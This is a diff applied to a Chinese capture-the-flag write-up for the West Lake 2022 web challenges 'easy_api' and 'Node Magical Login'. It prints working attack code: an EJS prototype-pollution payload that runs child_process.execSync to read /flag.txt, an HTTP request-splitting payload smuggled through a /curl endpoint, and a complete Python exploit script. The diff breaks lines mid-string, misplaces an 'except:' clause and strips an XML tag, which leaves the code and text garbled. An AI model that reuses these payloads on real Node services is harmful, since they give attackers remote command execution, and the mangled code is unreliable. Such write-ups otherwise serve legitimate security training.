@@ -29,7 +29,7 @@ easy_api
 
  <filter-mapping>
   <filter-name>loginfilter</filter-name>
-  <url-pattern>/api/*</url-pattern>
+  /api/*
  </filter-mapping>
  <filter>
   <filter-name>loginfilter</filter-name>
@@ -96,7 +96,8 @@ Node Magical Login
 
 但是 Math.random()是需要预测的（其值在运行代码前被存放到内存当中，由于本题并没有什么能够提供窃取内存随机数的方法，所以上述的if条件是基本无法满足的）我们肯定需要找一些其他的方法
 
-2、注意看定义/flag1的Flag1Controller，可以看到第二个if块能够读取cookie:user=admin的请求头值，从而获得/flag1，只是因为无法获取到SECRET_COOKIE的值，而导致无法获得/flag2的文件内容，所以需要继续看其他的函数
+2、注意看定义/flag1的Flag1Controller，可以看到第二个if块能够读取cookie:
+user=admin的请求头值，从而获得/flag1，只是因为无法获取到SECRET_COOKIE的值，而导致无法获得/flag2的文件内容，所以需要继续看其他的函数
 
 3、直接定位到/getflag2的CheckController函数，看到从表单输入的checkcode的length满足值为16即可通过if语句的检查，但是在try语句当中，由于对checkcode进行了一次大写的转换，导致checkcode无法等于aGr5AtSp55dRacer，从而无法获取flag2
 
@@ -136,7 +137,8 @@ x:
 '''.format(cmd,len(cmd))
 payload = payload.replace("n", "rn")
 payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
-requests.get('http://127.0.0.1:3000/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))
+requests.get('http://127.0.0.1:
+3000/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))
 
 2、剩下的就是原型链污染了，要怎么污染，污染什么参数。
 
@@ -166,7 +168,8 @@ image-20221108142655593
 将污染ejs的payload按上述方式转换为
 
 {"constructor.prototype.outputFunctionName":
-"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}
+"a=1;
+return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}
 
 最终payload
 
@@ -182,7 +185,8 @@ FLAG = sys.argv[3]
 
 # exp 函数
 def exp(ip, port):
- cmd='''{"constructor.prototype.outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}'''
+ cmd='''{"constructor.prototype.outputFunctionName":"a=1;
+return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}'''
  payload = ''' HTTP/1.1
 Host: x
 Connection: keep-alive
@@ -206,7 +210,8 @@ x:
   flag=re.findall("DASCTF{.*?}",r.text)[0]
   print(flag)
   return flag
- except:
+ 
+except:
   return ''
  print(r.text)
 
@@ -241,17 +246,12 @@ MISC｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write U
 ```
 <filter-mapping>
   <filter-name>loginfilter</filter-name>
-  <url-pattern>/api/*</url-pattern>
+  /api/*
  </filter-mapping>
  <filter>
   <filter-name>loginfilter</filter-name>
   <filter-class>com.dbappsecurity.common.loginFilter</filter-class>
  </filter>
-```
-
-
-
-```
 @RequestMapping(value="/api/test", method = RequestMethod.GET)
     public String test(Data data, ModelMap map) throws Exception{
         byte[] base64decodedBytes = Base64.getDecoder().decode(data.getData());
@@ -262,11 +262,6 @@ MISC｜西湖论剑·2022中国杭州网络安全技能大赛初赛官方Write U
 
         return "api";
     }
-```
-
-
-
-```
 protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
         String className = desc.getName();
 
@@ -289,17 +284,7 @@ protected Class resolveClass(ObjectStreamClass desc) throws IOException, C
         }
         return super.resolveClass(desc);
     }
-```
-
-
-
-```
 {"checkcode":{"length":16}}
-```
-
-
-
-```
 payload = ''' HTTP/1.1
 Host: x
 Connection: keep-alive
@@ -318,30 +303,17 @@ x:
 '''.format(cmd,len(cmd))
 payload = payload.replace("n", "rn")
 payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
-requests.get('http://127.0.0.1:3000/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))
-```
-
-
-
-```
+requests.get('http://127.0.0.1:
+3000/curl?q=%s'%(ip, port,urllib.parse.quote(payload)))
 {
 "__proto__":
 {
 "outputFunctionName":"a=1; return global.process.mainModule.constructor._load('child_process').execSync('ls'); //"
 }
 }
-```
-
-
-
-```
 {"constructor.prototype.outputFunctionName":
-"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}
-```
-
-
-
-```
+"a=1;
+return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}
 import urllib.parse
 import re
 import sys
@@ -354,7 +326,8 @@ FLAG = sys.argv[3]
 
 # exp 函数
 def exp(ip, port):
- cmd='''{"constructor.prototype.outputFunctionName":"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}'''
+ cmd='''{"constructor.prototype.outputFunctionName":"a=1;
+return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt');//"}'''
  payload = ''' HTTP/1.1
 Host: x
 Connection: keep-alive
@@ -378,7 +351,8 @@ x:
   flag=re.findall("DASCTF{.*?}",r.text)[0]
   print(flag)
   return flag
- except:
+ 
+except:
   return ''
  print(r.text)
 
